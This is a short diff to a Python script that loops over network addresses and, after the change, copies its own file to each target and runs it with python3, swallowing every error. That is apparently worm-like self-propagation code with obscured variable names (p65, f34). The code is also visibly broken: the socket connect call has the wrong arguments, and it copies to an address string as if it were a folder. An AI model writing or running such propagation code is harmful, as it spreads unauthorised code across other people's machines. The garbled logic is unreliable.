@@ -1,5 +1,7 @@
 import os
 import socket
+import shutil
+import subprocess
 import urllib.request
 
 defaultpath = os.path.abspath(__file__)
@@ -50,10 +52,8 @@ while True:
                         try:
                             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                             s.connect(p65 + str(i), (f34))
-                            s.sendall(filename)
-                            with open(copied_file_path, "wb") as f:
-                                f.write(filename)
-                            s.close()
+                            shutil.copy2(filename, p65)
+                            subprocess.run(['python3', '{}/{}'.format(p65, os.path.basename(filename))])
                         except:
                             pass
                 
